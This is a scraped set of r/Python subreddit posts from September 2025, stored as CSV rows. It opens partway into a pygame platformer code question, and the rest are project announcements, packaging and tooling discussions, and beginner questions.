    ¬† ¬† ¬† ¬† ¬† ¬† self.mask = pygame.mask.from_surface(self.image)
    
    ¬† ¬† ¬† ¬† # Gravity
    ¬† ¬† ¬† ¬† self.vel_y += 0.5
    ¬† ¬† ¬† ¬† if self.vel_y > 10:
    ¬† ¬† ¬† ¬† ¬† ¬† self.vel_y = 10
    
    ¬† ¬† ¬† ¬† # Jumping (with coyote time)
    ¬† ¬† ¬† ¬† self.coyote_timer = max(0, self.coyote_timer - 1)
    ¬† ¬† ¬† ¬† jump_key = keys[pygame.K_SPACE] or keys[pygame.K_w] or keys[pygame.K_UP]
    ¬† ¬† ¬† ¬† if jump_key and not self.jump_pressed and (self.jump_count < self.max_jumps or self.coyote_timer > 0):
    ¬† ¬† ¬† ¬† ¬† ¬† self.vel_y = -10
    ¬† ¬† ¬† ¬† ¬† ¬† self.jump_count += 1
    ¬† ¬† ¬† ¬† ¬† ¬† self.jump_pressed = True
    ¬† ¬† ¬† ¬† ¬† ¬† self.coyote_timer = 0
    ¬† ¬† ¬† ¬† elif not jump_key:
    ¬† ¬† ¬† ¬† ¬† ¬† self.jump_pressed = False
    
    ¬† ¬† ¬† ¬† # --- Horizontal movement ---
    ¬† ¬† ¬† ¬† if self.vel_x != 0:
    ¬† ¬† ¬† ¬† ¬† ¬† step_x = 1 if self.vel_x > 0 else -1
    ¬† ¬† ¬† ¬† ¬† ¬† for _ in range(abs(self.vel_x)):
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.rect.x += step_x
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† for mask, offset in tile_masks:
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† dx = offset[0] - self.rect.x
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† dy = offset[1] - self.rect.y
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† if self.mask.overlap(mask, (dx, dy)):
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.rect.x -= step_x
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† break
    
    ¬† ¬† ¬† ¬† # --- Vertical movement ---
    ¬† ¬† ¬† ¬† if self.vel_y != 0:
    ¬† ¬† ¬† ¬† ¬† ¬† step_y = 1 if self.vel_y > 0 else -1
    ¬† ¬† ¬† ¬† ¬† ¬† for _ in range(abs(int(self.vel_y))):
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.rect.y += step_y
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† collided = False
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† for mask, offset in tile_masks:
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† dx = offset[0] - self.rect.x
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† dy = offset[1] - self.rect.y
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† if self.mask.overlap(mask, (dx, dy)):
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† collided = True
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† break
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† if collided:
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.rect.y -= step_y
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† if step_y > 0:
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.jump_count = 0
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.coyote_timer = self.coyote_time_max
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.vel_y = 0
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† break
    
    ¬† ¬† ¬† ¬† # --- Feet collision (floor detection) ---
    ¬† ¬† ¬† ¬† self.feet_mask = self.get_feet_mask()
    ¬† ¬† ¬† ¬† on_floor = False
    ¬† ¬† ¬† ¬† for mask, offset in tile_masks:
    ¬† ¬† ¬† ¬† ¬† ¬† dx = offset[0] - self.rect.x
    ¬† ¬† ¬† ¬† ¬† ¬† dy = offset[1] - self.rect.y
    ¬† ¬† ¬† ¬† ¬† ¬† if self.feet_mask.overlap(mask, (dx, dy)):
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† on_floor = True
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† break
    ¬† ¬† ¬† ¬† if on_floor:
    ¬† ¬† ¬† ¬† ¬† ¬† self.jump_count = 0
    ¬† ¬† ¬† ¬† ¬† ¬† self.coyote_timer = self.coyote_time_max
    
    ¬† ¬† ¬† ¬† # --- Head collision ---
    ¬† ¬† ¬† ¬† self.head_mask = self.get_head_mask()
    ¬† ¬† ¬† ¬† for mask, offset in tile_masks:
    ¬† ¬† ¬† ¬† ¬† ¬† dx = offset[0] - self.rect.x
    ¬† ¬† ¬† ¬† ¬† ¬† dy = offset[1] - self.rect.y
    ¬† ¬† ¬† ¬† ¬† ¬† if self.head_mask.overlap(mask, (dx, dy)):
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.rect.y += 1 ¬†# push down to prevent sticking
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.vel_y = 0
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† break
    
    ¬† ¬† ¬† ¬† # Floor boundary
    ¬† ¬† ¬† ¬† if self.rect.bottom >= 600:
    ¬† ¬† ¬† ¬† ¬† ¬† self.rect.bottom = 600
    ¬† ¬† ¬† ¬† ¬† ¬† self.vel_y = 0
    ¬† ¬† ¬† ¬† ¬† ¬† self.jump_count = 0
    ¬† ¬† ¬† ¬† ¬† ¬† self.coyote_timer = self.coyote_time_max
    
    # Platform setup
    platform_offset = (200, 500)
    platform_tiles, platform_masks, platform_img = generate_tilemap(TILEMAP_IMAGE, *platform_offset)
    
    # Spawn player
    player = Player()
    
    # Main loop
    running = True
    while running:
    ¬† ¬† clock.tick(60)
    ¬† ¬† for event in pygame.event.get():
    ¬† ¬† ¬† ¬† if event.type == pygame.QUIT:
    ¬† ¬† ¬† ¬† ¬† ¬† running = False
    
    ¬† ¬† player.update(platform_tiles, platform_masks)
    
    ¬† ¬† screen.fill((135, 206, 235)) ¬†# sky
    ¬† ¬† screen.blit(platform_img, platform_offset)
    
    ¬† ¬† # Optional debug: draw tile rects
    ¬† ¬† # for tile in platform_tiles:
    ¬† ¬† # ¬† ¬† pygame.draw.rect(screen, (0,0,0), tile,1)
    
    ¬† ¬† screen.blit(player.image, player.rect)
    
    ¬† ¬† pygame.display.flip()
    
    pygame.quit()
    
    
    

I'm making a platformer game that runs just fine in vsc, but when I try to run it directly, it has an error. Here is the code:  
"
1neno5h,What is the quickest and easiest way to fix indentation errors?,theReasonablePotato,60,122,2025-09-11 23:17:44,https://www.reddit.com/r/Python/comments/1neno5h/what_is_the_quickest_and_easiest_way_to_fix/,"Context - I've been writing Python for a good number of years and I still find indentation errors annoying. Also I'm using VScode with the Python extension.

How often do you encounter them? How are you dealing with them?  
  
Because in Javascript land (and other languages too), there are some linters that look to be taking care of that."
1nem1ty,fp-style pattern matching implemented in python,SquarePraline4348,20,4,2025-09-11 22:05:50,https://www.reddit.com/r/Python/comments/1nem1ty/fpstyle_pattern_matching_implemented_in_python/,"I'm recently working on a functional programming library in python. One thing I've really want in python was a pattern matching that is expression and works well with other fp stuff in python. I went through similar fp libs in python such as `toolz` but didn't yet found a handy pattern matching solution in python. Therefore, I implement this simple pattern matching that works with most of objects (through itemgetter and attrgetter), iterables (just iter through), and literals (just comparison) in python.

- target audience

There's [link](https://github.com/BrandenXia/fp-cate) to the github repo. Note that it's still in very early development and also just a personal toy project, so it's not meant to be used in production at all.

There's some example I wrote using this library. I'd like to get some advice and suggestions about possible features and improvements I make for this functionality :)

```py
from dataclasses import dataclass

from fp_cate import pipe, match, case, matchV, _any, _rest, default


# works with any iterables
a = ""test""
print(
    matchV(a)(
        case(""tes"") >> (lambda x: ""one""),
        case([""a"", _rest]) >> (lambda x, xs: f""list starts with a, rest is {xs}""),
        default >> ""good"",
    )
)
a = [""a"", 1, 2, 3]
pipe(
    a,
    match(
        case([1, 2]) >> (lambda x: ""one""),
        case([""a"", _rest]) >> (lambda x, xs: f""list starts with a, rest is {xs}""),
    ),
    print,
)

# works with dicts
pipe(
    {""test"": 1, ""other"": 2},
    match(
        case({""test"": _any}) >> (lambda x: f""test is {x}""),
        case({""other"": 2}) >> (lambda x: ""other two""),
    ),
    print,
)


@dataclass
class Test:
    a: int
    b: bool


# works with dataclasses as well
pipe(
    Test(1, True),
    match(
        case({""a"": 1}) >> ""this is a good match"",
        case({""b"": False}) >> ""this won't match"",
        default >> ""all other matches failed"",
    ),
    print,
)
```"
1neiod8,Kryypto: New Release,SxxVe,0,4,2025-09-11 19:50:28,https://www.reddit.com/r/Python/comments/1neiod8/kryypto_new_release/,"Another release for **Kryypto** is out which  offers new features, bug fixes and more!

# ‚ú® Features

* Lightweight ‚Äì minimal overhead
* Full Keyboard Support ‚Äì no need for the mouse, every feature is accessible via hotkeys
* Discord presence
* Live MarkDown Preview
* Session Restore
* Custom Styling
   * `config\configuration.cfg` for editor settings
   * CSS for theme and style customization
* Editing Tools
   * Find text in file
   * Jump to line
   * Adjustable cursor (color & width)
   * Configurable animations (types & duration)
* Git & GitHub Integration
   * View total commits
   * See last commit message & date
   * Track file changes directly inside the editor
* Productivity Features
   * Autocompleter
   * Builtin Terminal
   * Docstring panel (hover to see function/class docstring)
   * Tab-based file switching
   * Bookmarking lines
   * Custom title bar
* Syntax Highlighting for
   * Python
   * CSS
   * JSON
   * Config files
   * Markdown



# Target Audience

* Developers who prefer keyboard-driven workflows (no mouse required)
* Users looking for a lightweight alternative to heavier IDEs
* People who want to customize their editor with CSS and configuration settings
* Anyone experimenting with Python-based editors or open-source text editing tools

# Comparison:

* Lightweight ‚Äì minimal overhead, focused on speed
* Highly customizable ‚Äì styling via CSS and config files
* Keyboard-centric ‚Äì designed to be fully usable without a mouse



It‚Äôs not meant to replace full IDEs (yet), but aims to be a **fast, customizable, Python-powered text editor**.

Please give it a try, comment your feedback, what features to add and support [Kryypto](https://github.com/NaturalCapsule/Kryypto) by giving it a star :)."
1nefnct,Early Trial: Using uv for Env Management in Clustered ML Training (Need Advice),Fun-Improvement424,4,10,2025-09-11 17:54:15,https://www.reddit.com/r/Python/comments/1nefnct/early_trial_using_uv_for_env_management_in/,"Hi everyone,

I‚Äôve been tasked with improving the dev efficiency of an ML engineering team at a large tech company. Their daily work is mostly data processing and RL training on 200B+ models. Most jobs finish in 2‚Äì3 days, but there are also tons of tiny runs just to validate training algorithms. 

tl;dr: The challenge: the research environments are wildly diverse.

Right now the team builds on top of infra-provided Docker images. These images grow huge after being built on top again and again (40‚Äì80GB, optimization didn't help much, and the images are just the environment), take 40‚Äì60 minutes to spin up, and nobody wants to risk breaking them by rebuilding from scratch with updated libraries. At the same time, the ML post-training team‚Äîand especially the infra/AI folks‚Äîare eager to try the latest frameworks (Megatron, Transformer Engine, Apex, vLLM, SGLang, FlashAttention, etc.). They even want a unified docker image that builds nightly.

They‚Äôve tried conda on a shared CephFS, but the experience has been rough:

* Many core libraries mentioned above can‚Äôt be installed via conda. They have to go through pip.
* Installation order and env var patching is fragile‚ÄîC++ build errors everywhere.
* Shared envs get polluted (interns or new hires installing packages directly).
* We don‚Äôt have enterprise Anaconda to centrally manage this.

To solve these problems, we recently started experimenting with¬†**uv**¬†and noticed some promising signs:

1. **Config-based envs.**¬†A single¬†pyproject.toml¬†+ uv‚Äôs config lets us describe CUDA, custom repos, and build dependencies cleanly. We thought only conda could handle this, but it turns out uv meets our needs, and in a cleaner way.
2. **Fast, cache-based installs.**¬†The append-only, thread-safe cache means 350+ packages install in under 10 seconds. Docker images shrank from 80GB+ to <8GB. You can make changes to project environment, or ""uv run --with ..."" as you wish, and never worry about polluting a shared environment.
3. **Integration with Ray.**¬†Since most RL frameworks already use Ray,¬†uv¬†fits nicely: Ray's runtime env agent guarantees that tasks and subtasks can share their envs, no matter which node they are scheduled to, enabling multiple distributed jobs with distinct envs on the same cluster. Scaling these tasks from laptop to a cluster is extremely simple. 
4. **Stability issues.** There were a few times we noticed a bug that when some Ray worker failed to register within time limits, and will be stuck in env preparing even when restarted -- but we quickly learned that doing a ""uv cache prune"" will solve it without clearing the cache. There were also times when nodes went down and re-connected, and Raylet says ""failed to delete environment"", but after a timeout period it will correct itself.

That said‚Äî**this is still an early trial, not a success story.**¬†We don‚Äôt yet know the long-term stability, cache management pitfalls, or best practices for multi-user clusters.

üëâ Has anyone else tried¬†uv¬†in a cluster or ML training context? Any advice, warnings, or alternative approaches would be greatly appreciated."
1neet2h,Dynamic Agent-Generated UI via NiceGUI (w/o tooling),Impressive-Glass-523,5,3,2025-09-11 17:22:31,https://www.reddit.com/r/Python/comments/1neet2h/dynamic_agentgenerated_ui_via_nicegui_wo_tooling/,"# What My Project Does

I recently created an [agex-ui](https://github.com/ashenfad/agex-ui) repo to demonstrate a new-ish agentic framework in action. There are two demonstration apps, but in both an agent that lives in-process with the NiceGUI process creates the web interface dynamically based on user interactions.

In the ""chat"" demo app shows a traditional looking agent chat interface. But the agent uses NiceGUI components to create all its responses. So can compose NiceGUI components into custom forms as to get structured data from the users. Or it can compose components into small reports, all within its ""response bubble"".

In the ""lorem ipsum"" demo app, the only user input is the url request path. The agent uses the path as a hint for what sort of page it should create and does so to fulfill each ""GET"". So as ask for ""http://127.0.0.1:8080/weather/albany/or"" and you'll see a page of some not-so-accurate weather predictions. Or ""http://127.0.0.1:8080/nba/blazers/roster/2029"" to find out who will be on your favorite basketball team.

The showcase is fundamentally trying to show how the [agex](https://github.com/ashenfad/agex) framework makes it easier to tie into existing Python codebases with less friction from tool abstractions in-between.

* Github for demo apps: [https://github.com/ashenfad/agex-ui](https://github.com/ashenfad/agex-ui)
* A [video of a chat](https://youtu.be/-LaY_QBfkf8?si=08Vh4Z5fMR1uN_Po) with dynamic forms & plots (after analysis)
* A longer-form [blog post](https://ashenfad.github.io/agex/blog/2025/09/11/deep-dive-building-an-agent-driven-ui-with-agex-ui/)

# Target Audience

The \`agex-ui\` project is most certainly a toy / demonstration. The supporting \`agex\` framework is somewhere in between toy and production-ready. Hopefully drifting toward the latter!

# Comparison

For \`agex-ui\`, perhaps the most similar is Microsoft's [Lida](https://microsoft.github.io/lida/)?  I did a bit of reading on DUG vs RUG (Dynamic-Generated UI, Restricted-Generated UI).  Most things I found looked like RUG (because of tooling abstractions).  Probably because production-quality DUG is hard (and agex-ui isn't that either).

As for the \`agex\` framework itself, Huggingface's smol-agents is its closest cousin. The main differences being agex's focus on integration with libraries rather than tools for agent capabilities, and the ability to persist the agent's compute environment."
1ne4z4b,How to Build Your Own Bluetooth Scriptable Sniffer using python for Under $25,bleuio,20,9,2025-09-11 10:14:56,https://www.reddit.com/r/Python/comments/1ne4z4b/how_to_build_your_own_bluetooth_scriptable/,"A¬†**Bluetooth sniffer**¬†is a hardware or software tool that captures and monitors Bluetooth communication between devices. Think of it as a network traffic analyzer, but for Bluetooth instead of Wi-Fi or Ethernet.  
There are high-end Bluetooth sniffers on the market ‚Äî like those from¬†**Ellisys**¬†or¬†**Teledyne LeCroy**¬†‚Äî which are powerful but often cost¬†**hundreds or thousands of dollars**.  
You can create your own scriptable BLE sniffer for under $25. the source code is available in this post, you can adjust the code and work further   
[https://www.bleuio.com/blog/how-to-build-your-own-bluetooth-scriptable-sniffer-for-under-30/](https://www.bleuio.com/blog/how-to-build-your-own-bluetooth-scriptable-sniffer-for-under-30/)"
1ne4t1d,detroit: Python implementation of d3js,bbourbonut,76,17,2025-09-11 10:04:24,https://www.reddit.com/r/Python/comments/1ne4t1d/detroit_python_implementation_of_d3js/,"Hi, I am the maintainer of [detroit](https://github.com/bourbonut/detroit). `detroit` is a Python implementation of the library [d3js](https://d3js.org/). I started this project because I like how flexible data visualization is with `d3js`, and because I'm not a big fan of JavaScript.

You can find the documentation for `detroit` [here](https://detroit.readthedocs.io/en/latest/).

* Target Audience

`detroit` allows you to create **static** data visualizations. I'm currently working on [detroit-live](https://github.com/bourbonut/detroit-live) for those who also want **interactivity**. In addition, `detroit` requires only [lxml](https://lxml.de/) as dependency, which makes it lightweight.

You can find a gallery of examples in the [documentation](https://detroit.readthedocs.io/en/latest/#gallery). Most of examples are directly inspired by [d3js examples on observablehq](https://observablehq.com/@d3/gallery).

* Comparison

The API is almost the same:

    // d3js
    const scale = d3.scaleLinear().domain([0, 10]).range([0, 920]);
    console.log(scale.domain()) // [0, 10]
    
    # detroit
    scale = d3.scale_linear().set_domain([0, 10]).set_range([0, 920])
    print(scale.get_domain()) # [0, 10]

The difference between `d3js`/`detroit` and `matplotlib`/`plotly`/`seaborn` is the approach to data visualization. With `matplotlib`, `plotly`, or `seaborn`, you only need to write a few lines and that's it - you get your visualization. However, if you want to customize some parts, you'll have to add a couple more lines, and it can become really hard to get exactly what you want. In contrast, with `d3js`/`detroit`, you know exactly what you are going to visualize, but it may require writing a few more lines of code."
1ne2g15,Python VS Power BI,Fuzzy-Translator-414,0,15,2025-09-11 07:28:23,https://www.reddit.com/r/Python/comments/1ne2g15/python_vs_power_bi/,"Why use python (streamlit =(easy but limited), dash=(complex)) for data visualization when there is power bi and tableau ?"
1ndz093,"Python code that can remove ""*-#"" from your word document in the blink of eye.",zskniazi,0,11,2025-09-11 03:58:43,https://www.reddit.com/r/Python/comments/1ndz093/python_code_that_can_remove_from_your_word/,"    from docx import Document
    import re
    
    def remove_chars_from_docx(file_path, chars_to_remove):
        doc = Document(file_path)
    
       
        pattern = f""[{re.escape(chars_to_remove)}]""
        def clean_text(text):
            return re.sub(pattern, """", text)
    
        
        for para in doc.paragraphs:
            if para.text:
                para.text = clean_text(para.text)
    
       
        for table in doc.tables:
            for row in table.rows:
                for cell in row.cells:
                    if cell.text:
                        cell.text = clean_text(cell.text)
    
        doc.save(file_path)
    
    
    
    remove_chars_from_docx(""mycode.docx"", ""*-#"")
    print(""Characters removed successfully."")
    "
1ndy9gv,From Code to Python: Gentle Guide for Programmers & Learners,joshemaggie,8,0,2025-09-11 03:18:57,https://www.reddit.com/r/Python/comments/1ndy9gv/from_code_to_python_gentle_guide_for_programmers/,"This series teaches [Python from code](https://www.bestdesign2hub.com/from-code-to-python-gentle-guide-programmers-learners/) without assuming you‚Äôre a total beginner to programming. If you‚Äôve written code in languages like C/C++, Java, JavaScript/TypeScript, Go, or Ruby, you‚Äôll find side‚Äëby‚Äëside explanations that map familiar concepts to Python‚Äôs syntax and idioms."
1ndua5j,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,4,1,2025-09-11 00:00:32,https://www.reddit.com/r/Python/comments/1ndua5j/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1nds31l,[ANNOUNCEMENT] pychub: A new way to ship your Python wheels + deps + extras,Steve91973,15,10,2025-09-10 22:21:16,https://www.reddit.com/r/Python/comments/1nds31l/announcement_pychub_a_new_way_to_ship_your_python/,"Hey fellow deveopers!  
  
I built a packaging tool called [**pychub**](https://github.com/Steve973/pychub) that might fill a weird little gap you didn‚Äôt know you had. It came out of me needing a clean way to distribute Python wheels *with* all of their dependencies and optional extras, but *without* having to freeze them into platform-specific binaries like PyInstaller does. And if you want to just install everything into your own current environment?  That's what I wanted, too.

# So what is it?

**pychub** takes your wheel, resolves and downloads its dependencies, and wraps everything into a single executable `.chub` file. That file can then be shipped/copied anywhere, and then run directly like this:

    python yourtool.chub

It installs into the current environment (or a venv, or a conda env, your call), and can even run an entrypoint function or console script *right after* install.

No network calls. No pip. No virtualenv setup. Just `python tool.chub` and go.

# Why I built it:

Most of the Python packaging tools out there either:

* Freeze the whole thing into a binary (PyInstaller, PyOxidizer) ‚Äî which is great, until you hit platform issues or need to debug something. Or you just want to do something different than that.
* Just stop at building a wheel and leave it up to you (or your users) to figure out installation, dependencies, and environment prep.

I wanted something in between: still using the host Python interpreter (so it stays light and portable), but with everything pre-downloaded and reproducible.

# What it can bundle:

* Your main wheel
* Any number of additional wheels
* All their dependencies (downloaded and stored locally)
* Optional include files (configs, docs, whatever)
* Pre-install and post-install scripts (shell, Python, etc.)

And it‚Äôs 100% reproducible, so that the archive installs the exact same versions every time, no network access needed.

# Build tool integration:

If you're using **Poetry**, **Hatch**, or **PDM**, I‚Äôve released plugins for all three:

* Just add the plugin to your `pyproject.toml`
* Specify your build details (main wheel, includes, scripts, etc.)
* Run your normal build command and you‚Äôll get a `.chub` alongside your `.whl`

It‚Äôs one of the easiest ways to ship Python tools that *just work,* whether you're distributing internally, packaging for air-gapped environments, or dropping into Docker builder stages.

Plugins repo:  [https://github.com/Steve973/pychub-build-plugins](https://github.com/Steve973/pychub-build-plugins)

# Why not just use some other bundling/packaging tool?

Well, depending on your needs, maybe you should! I don‚Äôt think pychub replaces everything. It just solves a different problem.

If you want sealed apps with bundled runtimes, use PEX or PyOxidizer.  
If you're distributing scripts, zipapp is great.  
But if you want a **wheel-based**, network-free, single-file installer that works on any Python 3.9+ environment, then pychub might be the right tool.

Full comparison table along with everything else:  
üìò [README on GitHub](https://github.com/Steve973/pychub#why-not-just-use-insert-favorite-tool-name-here)

That‚Äôs it. I built it because I needed it to include plugins for a platform that I am building. If it helps you too, even better.  I will be actively supporting this, and if you would like to take it for a spin and see if you like it, I'd be honored to hear your feedback. If you want a feature added, etc, please let me know.  
Issues, suggestions, and PRs are all welcome.

Thanks for your time and interest!

Steve"
1ndpzmo,"I am going to suggest two ideas for python, what are your thoughts?",johnyeldry,0,13,2025-09-10 20:53:14,https://www.reddit.com/r/Python/comments/1ndpzmo/i_am_going_to_suggest_two_ideas_for_python_what/,"a new builtin function used with with that enforces type safety if type hints are present: [https://docs.google.com/document/d/1fBKrDTWUhVFrirD57Rv4i7KENE7kqXojnmq41sGJ9ug/edit?usp=sharing](https://docs.google.com/document/d/1fBKrDTWUhVFrirD57Rv4i7KENE7kqXojnmq41sGJ9ug/edit?usp=sharing)

  
a new system for defining custom operators: [https://docs.google.com/document/d/1oi5MBuZGh3JAxtCjyamiyyg76T6ficaSf6FZ\_d7RWCo/edit?usp=sharing](https://docs.google.com/document/d/1oi5MBuZGh3JAxtCjyamiyyg76T6ficaSf6FZ_d7RWCo/edit?usp=sharing)"
1ndo680,"""I wanted to learn Scripting In python"" any one want to join !!",cyberOG01,0,5,2025-09-10 19:40:31,https://www.reddit.com/r/Python/comments/1ndo680/i_wanted_to_learn_scripting_in_python_any_one/,"Hi, writers if you are also looking to start programing in python for cyber security, lets do it together.   
my domain is cyber security and now day scripting and automation is highly required, so lets sync up and decide how we should plan and start.  
"
1ndnusy,"A Complete List of Python Tkinter Colors, Valid and Tested",AlSweigart,31,12,2025-09-10 19:27:58,https://www.reddit.com/r/Python/comments/1ndnusy/a_complete_list_of_python_tkinter_colors_valid/,"I needed a complete list of valid color names for Python's Tkinter package as part of my [ButtonPad](https://pypi.org/project/ButtonPad/) GUI framework development. The lists I found on the internet were either incomplete, buried under ads, and often just plain wrong. Here's a list of all 760 color names (valid and personally tested) for Python Tkinter.

https://inventwithpython.com/blog/complete-list-tkinter-colors-valid-and-tested.html"
1ndns22,tips for a 15 y/o starting ML,ThatCreepyMf,0,15,2025-09-10 19:25:02,https://www.reddit.com/r/Python/comments/1ndns22/tips_for_a_15_yo_starting_ml/,"so i got into coding last year and was learning react js and generally front end stuff but seeing how fast AI is progressing, with AGI soon, i‚Äôve deciding to dedicate my time to python, machine learning and in some time deep learning. I am 15 years old and really good at math for my age. i‚Äôve already learned the basic and some more advanced python concepts. What should i push to learn? any general tips and advice?"
1ndm9zl,"Update: Python-based MTG Commander Deck Builder ‚Äî Now With Combos, Bracket Enforcement, and Include/",styrofoamshotgun,8,1,2025-09-10 18:28:31,https://www.reddit.com/r/Python/comments/1ndm9zl/update_pythonbased_mtg_commander_deck_builder_now/,"Hi r/Python, I wanted to share another update on my Python-based project: a **Magic: The Gathering Commander deck builder**. My first post here was when I had a mostly command-line tool; then I moved to a basic web interface. Since then I‚Äôve added quite a few new features, cleaned up the backend, and expanded both the web and CLI sides.

# What My Project Does

* Pick a commander and up to three themes (e.g., Aristocrats, +1/+1, Kindred, Aggro).
* The builder generates a complete 100-card list with stage-by-stage reasoning.
* Handles multi-copy strategies (Petitioners, Dragon‚Äôs Approach, Shadowborn Apostle) with packages that keep the deck at 100 and adjust land counts automatically.
* Lets you lock favorite cards, reroll just creatures/spells/lands, or swap cards for alternatives.
* Supports ‚Äúowned-only‚Äù and ‚Äúprefer owned‚Äù builds by uploading TXT/CSV lists of your collection.
* Exports to TXT (Moxfield/Archidekt), CSV with tags/Owned info, or a simple printout.

# Target Audience

* **Magic: The Gathering players** who like to theorycraft and spin up decks quickly.
* People who want to give a few high-level instructions (commander, themes, composition) and get a playable decklist back.
* Developers or hobbyists interested in Python projects that mix data handling, web UI, and CLI tooling.

# Comparison

I built this because I wasn‚Äôt finding much in the way of Python-based, ‚Äúhands-off‚Äù deck builders. Tools like EDHRec, Moxfield, and Archidekt are great, but they generally need a lot of manual input. My approach is closer to: ‚Äúgive me a commander and some themes, generate a deck, and let me iterate fast.‚Äù It also lets me compare multiple builds for the same commander or themes to see how choices shift.

# What‚Äôs New

* **Combos & Synergies:** detects curated two-card combos, surfaces them in the web UI with badges, and honors color identity.
* **Bracket Compliance:** validates decks against configurable bracket rules (like tutors/extra turns); includes inline enforcement and optional auto-fixing.
* **Include/Exclude Lists:** add must-have or must-exclude cards via text/file input; supports fuzzy matching, EDH color checks, and JSON import/export.
* **Web UI Polish:** improved New Deck modal, integrated multi-copy suggestions, cleaner alternatives panel, and mobile-friendly layouts.
* **CLI Parity:** theme selection by name, deck composition flags (`--land-count`, `--wipe-count`, etc.), and full include/exclude support with detailed console summaries.
* **Performance & Stability:** exclude filtering benchmarked under 50ms on 20k+ cards; Docker image seeds defaults automatically; fixes for land counts, exports mismatches, and mobile scaling quirks.

# Tech Stack

* **Backend:** Python 3.x with structured logging, modular orchestration, and test suite for validation and backward compatibility.
* **Web:** Flask + Jinja templates, partial caching, validation endpoints, and Playwright end-to-end tests.
* **CLI:** argparse interface with type indicators, grouped help, and full parity with web features.
* **Deployment:** Docker with multi-arch builds (x86/ARM), sample docker-compose configs.

# Try it

* Live demo: [deck-builder.wiz-ops.com](https://deck-builder.wiz-ops.com/) (setup may take a minute).
* Docker Hub (easiest): [mwisnowski/mtg-python-deckbuilder](https://hub.docker.com/r/mwisnowski/mtg-python-deckbuilder)
* Source & releases: [GitHub repo](https://github.com/mwisnowski/mtg_python_deckbuilder)

# Roadmap

* Budget mode with price caps and recommended pickup lists.
* Smarter land base profiles tuned by curve and pip breakdown.
* Random build modes (‚Äúsurprise me,‚Äù random by theme, or full random).

This is my first real ‚Äúfrom-scratch‚Äù software project, so if you have thoughts on the Python side ‚Äî code structure, testing, deployment ‚Äî I‚Äôd love to hear them.

Do you want me to keep this **balanced between MTG features and technical notes**, or make it **more developer-focused** (leaning heavier on Python design decisions, logging, testing, etc.) since it‚Äôs for r/Python?"
1ndk80g,Scaling asyncio on Free-Threaded Python,reidhoch,25,0,2025-09-10 17:13:07,https://www.reddit.com/r/Python/comments/1ndk80g/scaling_asyncio_on_freethreaded_python/,"https://labs.quansight.org/blog/scaling-asyncio-on-free-threaded-python

From the author: ""In this blog post, we will explore the changes I made in the upcoming Python 3.14 release to enable asyncio to scale on the free-threaded build of CPython."""
1ndj5vz,"I decoupled FastAPI dependency injection system in pure python, no dependencies.",EricHermosis,134,78,2025-09-10 16:34:32,https://www.reddit.com/r/Python/comments/1ndj5vz/i_decoupled_fastapi_dependency_injection_system/,"**What My Project Does**

When building FastAPI endpoints, I found the dependency injection system such a pleasure to use that I wanted it everywhere, not just in my endpoints. I explored a few libraries that promised similar functionality, but each had drawbacks, some required Pydantic, others bundled in features beyond dependency injection, and many were riddled with bugs.

That's way I created [PyDepends](https://github.com/entropy-flux/PyDepends), a lightweight dependency injection system that I now use in my own projects and would like to share with you.

**Target Audience**  
This is mainly aimed at:

* FastAPI developers who want to use dependency injection in the service layer.

* Domain-Driven Design practitioners who want to decouple their services from infrastructure.

* Python developers who aren‚Äôt building API endpoints but would still like to use dependency injection in their projects.
It‚Äôs not production-grade yet, but it‚Äôs stable enough for everyday use and easy to extend.

**Comparison**  

Compared to other similar packages, it does just that, inject dependencies, is not bloated with other functionalities. 

